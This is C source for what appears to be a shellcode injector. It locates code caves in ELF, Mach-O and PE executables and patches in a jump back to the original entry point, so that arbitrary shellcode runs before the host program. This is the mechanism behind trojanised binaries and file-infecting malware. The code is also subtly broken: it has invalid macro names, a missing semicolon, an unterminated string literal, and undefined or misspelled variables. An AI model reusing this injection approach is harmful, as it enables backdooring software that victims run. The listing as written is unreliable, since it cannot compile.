#DEFINE ELF 1
#DEFINE MACH-O 2
#DEFINE PE 3
#DEFINE BIG_ENDIAN 1
#DEFINE LITTLE_ENDIAN 0
#DEFINE CODE_CAVE 1
#DEFINE SILVIO_METHOD 2
#DEFINE DYNAMIC_METHOD 3
#DEFINE NEW_SECTION 4
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "binject_mach-o.h"
#include "binject_pe.h"
#include "binject_elf.h"
int find_code_cave(uint32_t cave_size,uint32_t starting_offset,uint32_t ending_offset,char *buffer)
{
 uint32_t a,b;
  a=starting_offset;
 for(a;a<ending_offset;a++)
  {
   if(buffer[a]==0x00)
  b+=1;
   else
  b=0;
   if(b==cave_size)
  return a;
   }
 return -1;
}
int file_type(char* file)
{
 char buf[4];
 memset(buf,0x00,sizeof(buf));
 FILE *f
  f=fopen(file,"r");
 if(f==NULL)
   return -1;
 else
 {
 fread(buf,sizeof(char),4,f);
 fclose(f);
 if(strcmp(buf,"\x7f\x45\x4c\x46")==0x00)
  return ELF;
 if(strcmp(buf,"\xce\xfa\xed\xfe")==0x00)
  return MACH-O;
 if(strcmp(buf,"\xcf\xfa\xed\xfe")==0x00)
  return MACH-O;
 if(strcmp(buf,"\x4d\x5a\")==0x00)
  return PE; 
  }
           return -1;
}
char *ApplySuffixJmpIntel64(char *shellcode,uint32_t cave_offset,uint32_t entry_point,int byte_order)  
{
        int sclen = strlen(shellcode);
	char *retval = calloc(1,sclen+6);
	strcat(retval,shellcode);
	retval[sclen]=0xe9;
	uint32_t entryJump = entry_Point - (shellcodeVaddr + 5) - sclen;
	if(byte_order)
	{
		retval[sclen+1]=entryJump>>24;
		retval[sclen+2]=entryJump>>16;
		retval[sclen+3]=entryJump>>8;
		retval[sclen+4]=entryJump;
	}
	else
	{
		retval[sclen+1]=entryJump;
		retval[sclen+2]=entryJump>>8;
		retval[sclen+3]=entryJump>>16;
		retval[sclen+4]=entryJump>>24;
	}
	return retval;
}
int binject(char *file,char *shellcode)
           {
            int type;
            type=file_type(file);
             switch(type)
             { 
              case PE:
               binject_PE(file,shellcode);
              break;
              case MACH-O:
               binject_MACH-O(file,shellcode);
              break;
              case ELF:
               binject_ELF(file,shellcode);
              break;
              default:
               return -1;
              break;
              }
		   return 0;
           }
           
